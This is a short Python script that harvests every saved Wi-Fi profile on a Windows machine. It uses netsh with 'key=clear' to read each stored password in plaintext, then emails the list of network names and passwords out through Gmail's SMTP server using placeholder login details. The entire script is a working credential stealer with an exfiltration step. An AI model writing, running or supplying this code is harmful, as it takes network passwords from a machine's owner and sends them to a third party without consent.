import subprocess
import smtplib

content=""

a=subprocess.check_output(['netsh','wlan','show','profiles']).decode('utf-8').split('\n')
a = [i.split(':')[1][1:-1] for i in a if "All User Profile" in i]

for i in a:
    results=subprocess.check_output(['netsh','wlan','show','profiles',i,'key=clear']).decode('utf-8').split('\n')
    results=[b.split(':')[1][1:-1] for b in results if "Key Content" in b]
    try:
        content+=(str(i)+" "+str(results[0])+"\n")
        
    except IndexError:
        content+=(str(i)+" N/A\n")


mail = smtplib.SMTP('smtp.gmail.com',587)

mail.ehlo()

mail.starttls()

mail.login('email1','password1')

mail.sendmail('email2','email1',content)

mail.close
